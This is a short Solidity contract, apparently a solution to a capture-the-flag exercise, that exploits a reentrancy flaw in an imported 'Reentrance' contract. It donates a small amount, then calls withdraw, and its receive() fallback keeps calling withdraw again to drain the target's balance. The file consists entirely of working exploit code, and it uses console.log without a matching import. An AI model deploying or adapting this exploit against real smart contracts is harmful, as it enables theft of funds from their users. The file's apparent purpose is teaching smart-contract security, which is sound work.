// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        Reentrance(contractAddress).donate{value: 1, gas: 400000}(
            address(this)
        );
        Reentrance(contractAddress).withdraw(1);
    }

    receive() external payable {
        console.log("inside recieve: %s", address(contractAddress).balance);
        if (Reentrance(contractAddress).balanceOf(address(this)) != 0) {
            Reentrance(contractAddress).withdraw(1);
        }
    }
}
